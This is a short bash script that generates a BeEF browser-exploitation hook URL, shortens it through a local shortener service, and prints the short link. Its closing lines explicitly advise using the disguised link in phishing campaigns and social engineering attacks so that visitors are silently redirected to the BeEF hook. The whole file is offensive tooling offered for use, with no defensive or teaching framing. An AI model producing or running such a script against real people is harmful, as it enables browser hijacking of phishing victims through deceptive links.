#!/bin/bash

# Script to generate a shortened link for BeEF hook URL

# Configuration
BEEF_HOST="localhost"
BEEF_PORT="3000"
SHORTENER_HOST="localhost"
SHORTENER_PORT="8081"

# Full BeEF hook URL
HOOK_URL="http://$BEEF_HOST:$BEEF_PORT/hook.js"

# Send request to shorten the URL
RESPONSE=$(curl -s -X POST http://$SHORTENER_HOST:$SHORTENER_PORT/shorten \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"$HOOK_URL\"}")

# Extract the short URL from the response
SHORT_URL=$(echo $RESPONSE | grep -o '"shortUrl":"[^"]*"' | cut -d'"' -f4)

# Display the results
echo "BeEF Hook URL: $HOOK_URL"
echo "Shortened URL: $SHORT_URL"

echo ""
echo "You can now use the shortened URL in your phishing campaigns or social engineering attacks."
echo "When someone visits the shortened URL, they will be redirected to the BeEF hook."